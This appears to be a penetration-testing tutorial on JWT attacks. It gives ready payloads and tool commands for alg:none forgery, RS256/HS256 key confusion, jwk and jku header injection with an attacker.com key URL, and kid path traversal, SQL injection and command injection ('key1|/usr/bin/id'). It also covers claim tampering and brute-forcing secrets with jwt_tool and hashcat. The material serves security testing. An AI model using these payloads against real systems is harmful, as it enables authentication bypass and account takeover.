JWT Attacks
JWTs are everywhere  -  auth tokens, session management, API keys, SSO assertions. Developers often treat them as opaque tokens and assume the library handles security. But JWTs have a large attack surface: the algorithm can be changed, the signature can be bypassed, the key can be leaked or brute-forced, and header parameters like jwk, jku, and kid can be injected. When a JWT bypass works, the result is usually authentication bypass or privilege escalation.
JWT Structure
flowchart LR
    A["Header<br/>{alg: RS256, typ: JWT}"] --> D["base64url encode"]
    B["Payload<br/>{sub: user123, role: user}"] --> D
    D --> E["header.payload"]
    E --> F["Sign with key"]
    F --> G["header.payload.signature"]

A JWT is three base64url-encoded segments separated by dots: header.payload.signature. The header declares the algorithm. The payload contains claims. The signature ties them together. Every attack on this page targets the relationship between these three parts.
Algorithm None Attack
If the server doesn't enforce an algorithm whitelist, you can set alg to none and strip the signature:
GET /api/profile HTTP/1.1
Host: target.com
Authorization: REDACTED_********
The decoded header:
{"alg": "none", "typ": "JWT"}
The decoded payload:
{"sub": "1234", "user": "admin", "role": "admin"}
Note the trailing dot  -  the signature is empty. Test variants: none, None, NONE, nOnE. Some libraries accept any casing.
jwt_tool Commands
# Tamper with none algorithm
python3 jwt_tool.py <token> -X a
 
# This generates multiple variants with alg:none and modified claims
RS256 to HS256 Key Confusion
If the server uses RS256 (asymmetric  -  private key signs, public key verifies), you can change the algorithm to HS256 (symmetric  -  same key signs and verifies). The server's public key (which is often publicly available) becomes the HMAC secret:
# 1. Get the server's public key
# Check: /.well-known/jwks.json, /jwks.json, /oauth/discovery/keys, certificate from TLS
 
# 2. Sign a forged token with the public key as HMAC secret
python3 jwt_tool.py <token> -X k -pk public_key.pem
 
# 3. The server uses the public key to verify HS256  -  and it matches
This works because some JWT libraries use a single verify(token, key) function. When alg says HS256, it uses the provided key (the public key) as the HMAC secret. Since you also used that same public key to sign, the signature validates.
JWK Header Injection
The jwk header parameter lets the token embed its own public key for verification. If the server trusts the embedded key:
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "<attacker's public key modulus>",
    "e": "AQAB"
  }
}
Sign the token with your private key. Embed the matching public key in the jwk header. The server verifies using the attacker-supplied key.
# Generate with jwt_tool
python3 jwt_tool.py <token> -X i
 
# Or with Burp JWT Editor:
# 1. Generate new RSA key in JWT Editor Keys tab
# 2. In Repeater, switch to JSON Web Token tab
# 3. Edit payload claims (change role, sub, etc.)
# 4. Click "Embedded JWK" attack
JKU Header Injection
Similar to jwk, but jku (JWK Set URL) tells the server where to fetch the verification key:
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "attacker.com/.well-known/jwks.json"
}
Host a JWKS on your server containing your public key. Sign the token with your private key. If the server fetches from the attacker-controlled URL and uses that key to verify  -  bypass.
The server should validate jku against a whitelist, but test: open redirects on the target domain, URL parsing inconsistencies (target.com@attacker.com), path traversal in URL validation.
KID Parameter Attacks
The kid (Key ID) header tells the server which key to use for verification. The value is often used to look up a key from a database, file, or API. If the lookup is injectable:
Path Traversal via kid
{
  "alg": "HS256",
  "kid": "../../../../../../dev/null"
}
If the server reads the key from a file path based on kid, traversal to /dev/null gives an empty key. Sign the token with an empty string as the secret.
SQL Injection via kid
{
  "alg": "HS256",
  "kid": "key1' UNION SELECT 'attacker-controlled-secret' -- "
}
If kid is used in a SQL query, you can inject a known secret value and sign with it.
Command Injection via kid
{
  "alg": "HS256",
  "kid": "key1|/usr/bin/id"
}
Rare, but if kid is passed to a shell command for key retrieval.
Claim Tampering
Even without signature bypass, check for weak validation of claims:
{
  "sub": "user123",
  "role": "user",
  "email": "admin@target.com",
  "exp": 9999999999,
  "iss": "target.com"
}
Test modifying:

sub  -  change user ID
role / groups / is_admin  -  escalate privileges
email  -  impersonate another user
exp  -  extend expiration to far future
iss  -  change issuer if multi-tenant

Some applications verify the signature but don't validate claim values against their database  -  they trust whatever's in the JWT.
Key Discovery
Before attacking, find the key material:
# JWKS endpoints
/.well-known/jwks.json
/jwks.json
/oauth/discovery/keys
/.well-known/openid-configuration  (links to jwks_uri)
 
# Brute-force weak HS256 secrets
python3 jwt_tool.py <token> -C -d /path/to/wordlist.txt
hashcat -m 16500 <token> /path/to/wordlist.txt
 
# Common weak secrets: "secret", "password", "key", server name, empty string
Burp Setup: JWT Editor Extension

Install "JWT Editor" from BApp Store
Any request with a JWT shows a "JSON Web Token" tab in Repeater
JWT Editor Keys tab  -  generate RSA/EC/Symmetric keys for attacks
In Repeater: edit header/payload, then click attack buttons (None, Embedded JWK, etc.)
Scanner automatically checks for alg:none and key confusion

Checklist

 Decode the JWT and examine header algorithm and payload claims
 Test alg:none with empty signature (try case variants)
 If RS256: test key confusion attack by signing with the public key as HS256 secret
 Check for jwk header injection  -  embed your own key
 Check for jku header injection  -  point to your JWKS endpoint
 Test kid parameter for path traversal, SQLi, and command injection
 Enumerate JWKS endpoints (/.well-known/jwks.json, OpenID config)
 For HS256: brute-force the secret with jwt_tool or hashcat
 Tamper with claims (sub, role, email, exp) and test if changes are honored
 Check if expired tokens are still accepted
 Check if tokens are invalidated on logout/password change
